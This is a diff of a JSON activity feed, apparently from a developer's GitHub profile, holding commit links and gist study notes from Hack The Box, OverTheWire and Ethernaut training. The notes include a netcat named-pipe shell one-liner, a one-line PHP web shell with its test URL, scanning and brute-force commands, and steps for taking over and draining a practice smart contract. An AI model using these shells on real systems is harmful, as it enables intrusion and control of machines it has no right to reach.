@@ -1,13 +1,117 @@
 [
   {
+    "key": 14,
+    "html_link": "https://github.com/trmchale1/hacking/commit/3f4e0fdea8cc97f8f4704d32836925cb1a554a7c",
+    "branch": "main",
+    "timestamp": "2024-10-13T17:41:54Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 15,
+    "html_link": "https://github.com/trmchale1/hacking/commit/35802038808d4c52dcaf71d1ab361ab6dfb0501f",
+    "branch": "main",
+    "timestamp": "2024-10-13T04:04:30Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 16,
+    "html_link": "https://github.com/trmchale1/hacking/commit/5cdd42cb894c17bf081da19faecb321643812908",
+    "branch": "main",
+    "timestamp": "2024-10-12T15:47:42Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 17,
+    "html_link": "https://github.com/trmchale1/hacking/commit/5434038a68ca3507b4f9d45a87cf52ff600ccb03",
+    "branch": "main",
+    "timestamp": "2024-10-11T15:23:25Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 18,
+    "html_link": "https://github.com/trmchale1/hacking/commit/43a22e350bd93aacdd8615de1e76376b4194f059",
+    "branch": "main",
+    "timestamp": "2024-10-10T15:03:47Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 19,
+    "html_link": "https://github.com/trmchale1/hacking/commit/a9772a497b025f68b1722b830c6f031a13e39c30",
+    "branch": "main",
+    "timestamp": "2024-10-09T23:02:12Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 20,
+    "html_link": "https://github.com/trmchale1/hacking/commit/03e1a25dcaa4bded18f7764af4568353924e7f8b",
+    "branch": "main",
+    "timestamp": "2024-10-08T03:49:36Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 21,
+    "html_link": "https://github.com/trmchale1/hacking/commit/7737c808db32aeb7527a5c4f9e56a022063dc1d9",
+    "branch": "main",
+    "timestamp": "2024-10-08T01:38:07Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 22,
+    "html_link": "https://github.com/trmchale1/hacking/commit/15760d9744fc45260660137dbe1afbec9cda0a2c",
+    "branch": "main",
+    "timestamp": "2024-10-07T02:58:30Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 23,
+    "html_link": "https://github.com/trmchale1/hacking/commit/5de2a2e48ff5e8e5555870870bb7d79826c3a812",
+    "branch": "main",
+    "timestamp": "2024-10-06T17:23:45Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 24,
+    "html_link": "https://github.com/trmchale1/hacking/commit/c67b183bd96d3f08ee24e56bd56a6670e807bacd",
+    "branch": "main",
+    "timestamp": "2024-10-06T16:36:23Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 25,
+    "html_link": "https://github.com/trmchale1/hacking/commit/c2ca8a4f1292ae17c06620a651fbfaf0df1eb808",
+    "branch": "main",
+    "timestamp": "2024-10-05T01:50:37Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
+    "key": 26,
+    "html_link": "https://github.com/trmchale1/hacking/commit/78d8db861b36c857eff67597f1221b20e0cf1984",
+    "branch": "main",
+    "timestamp": "2024-10-03T16:44:48Z",
+    "activity_type": "push",
+    "repo": "hacking"
+  },
+  {
     "key": 0,
     "html_link": "https://gist.github.com/trmchale1/3d298beca1c7c42f1177a6eca06deeb7",
     "timestamp": "2024-10-01T17:34:38Z",
     "description": "",
-    "content": "I disliked some of my notes yesterday regarding reverse shells on a target machine. \n\nI hope these notes are more clear, as getting a shell on an attacking box is a critical skill.\n\nOn the target machine we can run a bash command like:\n```\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l {ip attacking box} {attacking port} > /tmp/f\n```\n\nAnd on our host machine we can listen for the pipe, (the ip address and port number will the same)\n\n```\nnc -nv {ip attacking box} {some port}\n```"
+    "content": "I disliked some of my notes yesterday regarding reverse shells on a target machine. \n\n\nI hope these notes are more clear, as getting a shell on an attacking box is a critical skill.\n\n\nOn the target machine we can run a bash command like:\n```\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l {ip attacking box} {attacking port} > /tmp/f\n```\n\n\nAnd on our host machine we can listen for the pipe, (the ip address and port number will the same)\n\n```\nnc -nv {ip attacking box} {some port}\n```"
   },
   {
-    "key": 15,
+    "key": 27,
     "html_link": "https://github.com/trmchale1/hacking/commit/2fdfbc8e5425434e15a514204f3bc831da349f61",
     "branch": "main",
     "timestamp": "2024-10-01T01:47:19Z",
@@ -19,10 +123,10 @@
     "html_link": "https://gist.github.com/trmchale1/fdb16241b570be78d59947d69621f501",
     "timestamp": "2024-10-01T01:43:50Z",
     "description": "",
-    "content": "I was able to finish hackthebox's Academy, which is 28 modules and about 2 months worth of videos, trainings, and questions in real life hacking scenarios.\n\nSome of the commands I found myself using were:\n\nAdding to the hosts file. The /etc/hosts file is used to resolve a hostname into an ip address.\n```\necho \"{target_ip} ignition.htb\" | sudo tee -a /etc/hosts\n```\n\nNmap, this command with the flag --min-rate specifies the number of packets that nmap should send per second,\nthe higher the number the faster the scan.\n```\nnmap -p- --min-rate=1000 -sV {target_ip}\n```\n\nNmap with script scanning and version detection, one of the more intrusive nmap scans, with a high probability of\nbeing caught. It produces attractive and verbose output. Use as a first scan if unconcerned with detection.\n```\nsudo nmap -sC -sV {target_ip}\n```\n\nGobuster brute-force web-app directory structure\n```\nsudo gobuster dir -w /usr/share/wordlists/common.txt -u {target ip}\n```\n\nA wordlist for gobuster brute force attacks:\n```\ngit clone https://github.com/danielmiessler/SecLists.git\n```\n\nRDP into a windows host:\n```\nxfreerdp /v:{target ip} /u:Administrator\n```\n\nList SMB shares\n```\nsmbclient -L {target ip}\n```\n\nLogin to SMB share:\n```\nsmbclient \\\\\\\\{target ip}\\\\share\n```\n\nPHP, if we can upload the following php file to a web-app\n```\n<?php system($_GET[\"cmd\"]); ?>\n```\nAnd if the web-app responds with the output of the OS command `id`,\n```\nhttp://{ip address or dns name}/shell.php?cmd=id\n```\n\nThen we know we can upload a reverse shell via the web-app.\n"
+    "content": "I was able to finish hackthebox's Academy, which is 28 modules and about 2 months worth of videos, trainings, and questions in real life hacking scenarios.\n\n\nSome of the commands I found myself using were:\n\n\nAdding to the hosts file. The /etc/hosts file is used to resolve a hostname into an ip address.\n```\necho \"{target_ip} ignition.htb\" | sudo tee -a /etc/hosts\n```\n\n\nNmap, this command with the flag --min-rate specifies the number of packets that nmap should send per second,\nthe higher the number the faster the scan.\n```\nnmap -p- --min-rate=1000 -sV {target_ip}\n```\n\n\nNmap with script scanning and version detection, one of the more intrusive nmap scans, with a high probability of\nbeing caught. It produces attractive and verbose output. Use as a first scan if unconcerned with detection.\n```\nsudo nmap -sC -sV {target_ip}\n```\n\n\nGobuster brute-force web-app directory structure\n```\nsudo gobuster dir -w /usr/share/wordlists/common.txt -u {target ip}\n```\n\n\nA wordlist for gobuster brute force attacks:\n```\ngit clone https://github.com/danielmiessler/SecLists.git\n```\n\n\nRDP into a windows host:\n```\nxfreerdp /v:{target ip} /u:Administrator\n```\n\n\nList SMB shares\n```\nsmbclient -L {target ip}\n```\n\n\nLogin to SMB share:\n```\nsmbclient \\\\\\\\{target ip}\\\\share\n```\n\n\nPHP, if we can upload the following php file to a web-app\n```\n<?php system($_GET[\"cmd\"]); ?>\n```\nAnd if the web-app responds with the output of the OS command `id`,\n```\nhttp://{ip address or dns name}/shell.php?cmd=id\n```\n\n\nThen we know we can upload a reverse shell via the web-app.\n"
   },
   {
-    "key": 16,
+    "key": 28,
     "html_link": "https://github.com/trmchale1/hacking/commit/27e5c4b44052edcc3f85d9eb0ea5dae75c5d16a6",
     "branch": "main",
     "timestamp": "2024-09-25T23:08:05Z",
@@ -34,10 +138,10 @@
     "html_link": "https://gist.github.com/trmchale1/2e7adacea695b96f17ae19e4a6bfab42",
     "timestamp": "2024-09-19T23:35:23Z",
     "description": "",
-    "content": "Today I pushed some notes from my work on https://academy.hackthebox.com/. I've been diving deeper into cybersecurity and\nfound their educational material to be excellent. My goal is to get certified on their CPTS, certified pentesting specialist exam,\nwhich I am preparing for now. I'm going to use Hack The Box's educational material to sharpen my skills and take a shot at \nOffensive Security's OSCP certification, which seems to be the standard in the industry for early professionals in cybersecurity.\n\nA few tools I find myself using:\n\n```nmap -sV [ip address]```\n\nI use nmap for port sniffing, and reconnaissance to surveil a target. Nmap has a large number of flags and options, but the -sV \nflag gets the service and version running on open ports.\n\nThe metasploit framework offers a command line interface (as well as GUI) that has a library of vulnerabilites to attack a target.\nIf we get the right information from our recon, and there is a vulnerability on that version of machine or service, we can attack it directly.\n\nGobuster is a command line tool used for brute forcing directories, subdomains, and vhosts. It uses a wordlist to attempt to find the directory structure of a web app.\n\nHydra is a command line tool we can use to brute force ssh."
+    "content": "Today I pushed some notes from my work on https://academy.hackthebox.com/. I've been diving deeper into cybersecurity and\nfound their educational material to be excellent. My goal is to get certified on their CPTS, certified pentesting specialist exam, which I am preparing for now. I'm going to use Hack The Box's educational material to sharpen my skills and take a shot at Offensive Security's OSCP certification, which seems to be the standard in the industry for early professionals in cybersecurity.\n\n\nA few tools I find myself using:\n\n\n```nmap -sV [ip address]```\n\n\nI use nmap for port sniffing, and reconnaissance to surveil a target. Nmap has a large number of flags and options, but the -sV flag gets the service and version running on open ports.\n\n\nThe metasploit framework offers a command line interface (as well as GUI) that has a library of vulnerabilites to attack a target.\n\n\nIf we get the right information from our recon, and there is a vulnerability on that version of machine or service, we can attack it directly.\n\n\nGobuster is a command line tool used for brute forcing directories, subdomains, and vhosts. It uses a wordlist to attempt to find the directory structure of a web app.\n\n\nHydra is a command line tool we can use to brute force ssh."
   },
   {
-    "key": 17,
+    "key": 29,
     "html_link": "https://github.com/trmchale1/hacking/commit/1e3d4881c71f1a7ec7e9c2fad8c3427c5c9549a7",
     "branch": "main",
     "timestamp": "2024-09-19T23:08:10Z",
@@ -45,7 +149,7 @@
     "repo": "hacking"
   },
   {
-    "key": 18,
+    "key": 30,
     "html_link": "https://github.com/trmchale1/hacking/commit/eaf8b6eb6395b02447d8fb1385517146fe33008b",
     "branch": "main",
     "timestamp": "2024-09-13T12:27:35Z",
@@ -53,7 +157,7 @@
     "repo": "hacking"
   },
   {
-    "key": 19,
+    "key": 31,
     "html_link": "https://github.com/trmchale1/hacking/commit/d8767d9993cef1fc12edfc271a0e5b93fdaf12cf",
     "branch": "main",
     "timestamp": "2024-09-13T11:48:18Z",
@@ -61,7 +165,7 @@
     "repo": "hacking"
   },
   {
-    "key": 20,
+    "key": 32,
     "html_link": "https://github.com/trmchale1/hacking/commit/1398215a60047869067e02708500abc4c958031b",
     "branch": "main",
     "timestamp": "2024-09-13T11:18:58Z",
@@ -69,7 +173,7 @@
     "repo": "hacking"
   },
   {
-    "key": 21,
+    "key": 33,
     "html_link": "https://github.com/trmchale1/hacking/commit/e297eeae004dc06772513d74f06b7067035b5428",
     "branch": "main",
     "timestamp": "2024-09-02T16:11:31Z",
@@ -77,7 +181,7 @@
     "repo": "hacking"
   },
   {
-    "key": 22,
+    "key": 34,
     "html_link": "https://github.com/trmchale1/hacking/commit/da68e0ae391f4271be86dd46ad75eda310311776",
     "branch": "main",
     "timestamp": "2024-09-02T15:54:39Z",
@@ -85,7 +189,7 @@
     "repo": "hacking"
   },
   {
-    "key": 23,
+    "key": 35,
     "html_link": "https://github.com/trmchale1/hacking/commit/98ffb4c4cacd711bfee01a4ccab4769e9a6ee027",
     "branch": "main",
     "timestamp": "2024-09-01T20:31:04Z",
@@ -93,7 +197,7 @@
     "repo": "hacking"
   },
   {
-    "key": 24,
+    "key": 36,
     "html_link": "https://github.com/trmchale1/hacking/commit/002c1bbd46f352d29dc96afe98cf08ce9cc1e370",
     "branch": "main",
     "timestamp": "2024-09-01T20:05:31Z",
@@ -101,7 +205,7 @@
     "repo": "hacking"
   },
   {
-    "key": 25,
+    "key": 37,
     "html_link": "https://github.com/trmchale1/hacking/commit/138f64907e719eb4d4090e7afb080a57075cb8b0",
     "branch": "main",
     "timestamp": "2024-09-01T19:40:20Z",
@@ -109,7 +213,7 @@
     "repo": "hacking"
   },
   {
-    "key": 26,
+    "key": 38,
     "html_link": "https://github.com/trmchale1/hacking/commit/6e8371006f313b46cf11dbf9b54f2f9eeea6e444",
     "branch": "main",
     "timestamp": "2024-09-01T19:11:27Z",
@@ -117,7 +221,7 @@
     "repo": "hacking"
   },
   {
-    "key": 27,
+    "key": 39,
     "html_link": "https://github.com/trmchale1/hacking/commit/520834648a573bce9e13d2533eaf0ff6cc51c192",
     "branch": "main",
     "timestamp": "2024-09-01T17:22:24Z",
@@ -125,7 +229,7 @@
     "repo": "hacking"
   },
   {
-    "key": 28,
+    "key": 40,
     "html_link": "https://github.com/trmchale1/hacking/commit/be32aafb3a8b4cfcf0178ddccb030c08eafe8cd8",
     "branch": "main",
     "timestamp": "2024-09-01T17:08:41Z",
@@ -137,10 +241,10 @@
     "html_link": "https://gist.github.com/trmchale1/e6338482dd2052176909a82c09a4732b",
     "timestamp": "2024-09-01T00:41:51Z",
     "description": "OverTheWire - Pentesting Notes",
-    "content": "Shook the rust off of Visual Studio Code and was surprised to find a well documented directory w/ Dockerfile and docker-compose file running kali linux with a dozen or so shell scripts for a wargame called ```Bandit```.\nThe wargame is from a webapp called OverTheWire which offers free wargames to practice pentesting skills, link here -> https://overthewire.org/wargames/bandit/\nEach level of the Bandit wargame has you break into a linux virtual machine, the previous level's task guides you to a password, which you need to login to the next level's virtual machine.\nThis summer I took some classes in Calculus and Physics and this was a good way stretching out my command line and scripting skills for upcoming interviews.\nA summary of some of the commands I used:\n- sshpass - automates the process of ssh into a VM, allows you to run commands upon logging in\n- grep - searches plaintext\n- find - directory search, using syntax, filesize, expressive options\n- 2>/dev/null - when you want to throw away garbage\n- cut - extracts text from each line of a file\n- sort - sorts lines from a textfile\n- uniq - fed lines from standard input or a file, outputs only unique text\n- strings - extract strings from a binary file\n- base64 - and encoder and decoder, to help transmit data over a network w/o running into errors\n- tr - traslates or deletes characters, useful if you want implement ROT13 or the Caesar cipher\n- mktemp - creates temporary folder/file\n- xxd - hexdump or the reverse\n- gzip - compression tool, header is \\x1F\\x8B\\x08\n- bzip2 - compression tool, header is 425a, the next byte gives the version\n- tar - compress to/from archive\n- scp - copy files \n\nThe code can be found here -> https://github.com/trmchale1/hacking"
+    "content": "Shook the rust off of Visual Studio Code and was surprised to find a well documented directory w/ Dockerfile and docker-compose file running kali linux with a dozen or so shell scripts for a wargame called ```Bandit```.\n\n\nThe wargame is from a webapp called OverTheWire which offers free wargames to practice pentesting skills, link here -> https://overthewire.org/wargames/bandit/\n\n\nEach level of the Bandit wargame has you break into a linux virtual machine, the previous level's task guides you to a password, which you need to login to the next level's virtual machine.\n\n\nThis summer I took some classes in Calculus and Physics and this was a good way stretching out my command line and scripting skills for upcoming interviews.\n\n\nA summary of some of the commands I used:\n\n\n- sshpass - automates the process of ssh into a VM, allows you to run commands upon logging in\n- grep - searches plaintext\n- find - directory search, using syntax, filesize, expressive options\n- 2>/dev/null - when you want to throw away garbage\n- cut - extracts text from each line of a file\n- sort - sorts lines from a textfile\n- uniq - fed lines from standard input or a file, outputs only unique text\n- strings - extract strings from a binary file\n- base64 - and encoder and decoder, to help transmit data over a network w/o running into errors\n- tr - traslates or deletes characters, useful if you want implement ROT13 or the Caesar cipher\n- mktemp - creates temporary folder/file\n- xxd - hexdump or the reverse\n- gzip - compression tool, header is \\x1F\\x8B\\x08\n- bzip2 - compression tool, header is 425a, the next byte gives the version\n- tar - compress to/from archive\n- scp - copy files \n\n\n\nThe code can be found here -> https://github.com/trmchale1/hacking"
   },
   {
-    "key": 29,
+    "key": 41,
     "html_link": "https://github.com/trmchale1/hacking/commit/31f946d1a9b943fac27779bd1bf39858baa9c93b",
     "branch": "main",
     "timestamp": "2024-08-31T23:18:48Z",
@@ -148,7 +252,7 @@
     "repo": "hacking"
   },
   {
-    "key": 30,
+    "key": 42,
     "html_link": "https://github.com/trmchale1/hacking/commit/ec949599c9737caa2f5e202df19a4437eb701004",
     "branch": "main",
     "timestamp": "2024-08-31T22:58:31Z",
@@ -156,7 +260,7 @@
     "repo": "hacking"
   },
   {
-    "key": 31,
+    "key": 43,
     "html_link": "https://github.com/trmchale1/hacking/commit/2b2dfe96cb3169c4ed358c453b924e9aecb759ce",
     "branch": "main",
     "timestamp": "2024-08-31T20:07:11Z",
@@ -164,67 +268,11 @@
     "repo": "hacking"
   },
   {
-    "key": 32,
-    "html_link": "https://github.com/trmchale1/hacking/commit/28ec1d3a88f2ee7ad517b9ff20f3673ed704b242",
-    "branch": "main",
-    "timestamp": "2024-08-30T23:23:18Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 33,
-    "html_link": "https://github.com/trmchale1/hacking/commit/5c2d6b1955b69f4da6c003da005542d6944c6ee7",
-    "branch": "main",
-    "timestamp": "2024-08-30T23:13:40Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 34,
-    "html_link": "https://github.com/trmchale1/hacking/commit/d99462fc6561090379f4c2b94df5e9a3602cf226",
-    "branch": "main",
-    "timestamp": "2024-08-30T23:00:40Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 35,
-    "html_link": "https://github.com/trmchale1/hacking/commit/c9df9bae383799cd1a120065dbfe6e5a26158794",
-    "branch": "main",
-    "timestamp": "2024-08-30T22:49:26Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 36,
-    "html_link": "https://github.com/trmchale1/hacking/commit/5bae45bcedb509a0c8267da70cf45c0f41c570d5",
-    "branch": "main",
-    "timestamp": "2024-08-30T20:49:45Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 37,
-    "html_link": "https://github.com/trmchale1/hacking/commit/8a34636b8fb4f456ea6772bdb1cb8ab79f80bc4d",
-    "branch": "main",
-    "timestamp": "2024-08-30T20:06:01Z",
-    "activity_type": "push",
-    "repo": "hacking"
-  },
-  {
-    "key": 38,
-    "html_link": "https://github.com/trmchale1/hacking/commit/1a4f1c781a71c3d0f207c621a6def72c6cb729f3",
-    "branch": "main",
-    "timestamp": "2024-08-30T18:49:48Z",
-    "activity_type": "branch_creation",
-    "repo": "hacking"
-  },
-  {
     "key": 4,
     "html_link": "https://gist.github.com/trmchale1/e19daf647046dcb9d50134ee270812c7",
     "timestamp": "2024-03-24T21:46:28Z",
     "description": "git reset --hard",
-    "content": "Today I ran a command I would use rarely, and if it were in a workplace environment, would actually be a pretty big deal.\n\n``` git reset --hard 6894f6e1...```\n\nLike an artist, you have to look at your work and realize that some of it is utter junk and needs to be thrown out. Bad code smells. \n\nIt smells like 1000+ lines of code changes, with changes to configs that indicate potential dependency conflicts.\n\nIn this case I wanted to integrate RainbowKit to my personal website timmchale.co, the css in this new download clashed with my current css and postprocessing.\n\nI spent several days debugging dependency issues and deleting core functionality of the Gatsby app that I started with.\n\nNow I am realizing I built my web-app with Gatsby, which was fine for a one page app with simple html like functionality, but I need to go with Next.js for improved routing functionality.\n\nKeeping code small, with simple workflows consistently works for me. Any time I put too much functionality together, things tend to break.\n\nI used ```git reset``` because I wanted to change where the HEAD was pointing at, this command alters previous history, going back in time, so to speak.\n\nI felt I needed to use reset because the branch I started the dev work in had already been merged with a long history into the main branch. And I wanted that history removed as well.\n\nIn most cases when correcting the mistake of just one commit, you want to use the ```git revert``` command, github's user interface has a good revert feature in the pull request tab."
+    "content": "Today I ran a command I would use rarely, and if it were in a workplace environment, would actually be a pretty big deal.\n\n\n``` git reset --hard 6894f6e1...```\n\n\nLike an artist, you have to look at your work and realize that some of it is utter junk and needs to be thrown out. Bad code smells. \n\n\nIt smells like 1000+ lines of code changes, with changes to configs that indicate potential dependency conflicts.\n\n\nIn this case I wanted to integrate RainbowKit to my personal website timmchale.co, the css in this new download clashed with my current css and postprocessing.\n\n\nI spent several days debugging dependency issues and deleting core functionality of the Gatsby app that I started with.\n\n\nNow I am realizing I built my web-app with Gatsby, which was fine for a one page app with simple html like functionality, but I need to go with Next.js for improved routing functionality.\n\n\nKeeping code small, with simple workflows consistently works for me. Any time I put too much functionality together, things tend to break.\n\n\nI used ```git reset``` because I wanted to change where the HEAD was pointing at, this command alters previous history, going back in time, so to speak.\n\n\nI felt I needed to use reset because the branch I started the dev work in had already been merged with a long history into the main branch. And I wanted that history removed as well.\n\n\nIn most cases when correcting the mistake of just one commit, you want to use the ```git revert``` command, github's user interface has a good revert feature in the pull request tab."
   },
   {
     "key": 8,
@@ -275,32 +323,24 @@
     "repo": "tim-s-gatsby-app"
   },
   {
-    "key": 14,
-    "html_link": "https://github.com/trmchale1/tim-s-gatsby-app/commit/889928a725b85b71c33c8615c3b1fe6c3a82ce5a",
-    "branch": "master",
-    "timestamp": "2024-03-12T18:34:02Z",
-    "activity_type": "pr_merge",
-    "repo": "tim-s-gatsby-app"
-  },
-  {
     "key": 5,
     "html_link": "https://gist.github.com/trmchale1/e4c10dd319b83e2c043c7e729402de1a",
     "timestamp": "2024-03-04T01:17:44Z",
     "description": "timmchale.co is now live",
-    "content": "This is a link to the first release of timmchale.co \n\nhttps://github.com/trmchale1/tim-s-gatsby-app/releases/tag/v1.0.0\n\nThis is a link to my website \n\ntimchale.co"
+    "content": "This is a link to the first release of timmchale.co \n\n\nhttps://github.com/trmchale1/tim-s-gatsby-app/releases/tag/v1.0.0\n\n\nThis is a link to my website \n\n\ntimchale.co"
   },
   {
     "key": 6,
     "html_link": "https://gist.github.com/trmchale1/4088356e12bd482146a1afadbe99c4e0",
     "timestamp": "2024-02-21T16:33:32Z",
     "description": "Smart Contract Audit Ethernaut: Fallout",
-    "content": "The constructor has incorrect syntax and is misspelled, you can call it as a function and change the ownership of the contract:\n\n``` contract.Fal1out() ```"
+    "content": "The constructor has incorrect syntax and is misspelled, you can call it as a function and change the ownership of the contract:\n\n\n``` contract.Fal1out() ```"
   },
   {
     "key": 7,
     "html_link": "https://gist.github.com/trmchale1/95b69f2fae637f6511b9818aa007d5b0",
     "timestamp": "2024-02-20T01:27:08Z",
     "description": "Smart Contract Audit Ethernaut: Fallback",
-    "content": "Smart Contract Audit Ethernaut: Fallback\n\nIn this game the player must become the owner, then withdraw the full amount from the contract.\n\nThe key part is the receive() function, if the contract recieves a value greater than 0 and contributions of the sender are also greater than zero, then the sender becomes the owner.\n\nWe send some small sum to the player:\n\n``` await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')}) ```\n\nWe send a small sum to the contract:\n\n``` await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) ```\n\nCheck we own the contract:\n\n``` await contract.owner() ```\n\nThen withdraw the loot:\n\n``` await contract.withdraw() ```"
+    "content": "Smart Contract Audit Ethernaut: Fallback\n\n\nIn this game the player must become the owner, then withdraw the full amount from the contract.\n\n\nThe key part is the receive() function, if the contract recieves a value greater than 0 and contributions of the sender are also greater than zero, then the sender becomes the owner.\n\n\nWe send some small sum to the player:\n\n\n``` await contract.contribute.sendTransaction({ from: player, value: toWei('0.0009')}) ```\n\n\nWe send a small sum to the contract:\n\n\n``` await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) ```\n\n\nCheck we own the contract:\n\n\n``` await contract.owner() ```\n\n\nThen withdraw the loot:\n\n\n``` await contract.withdraw() ```"
   }
 ]
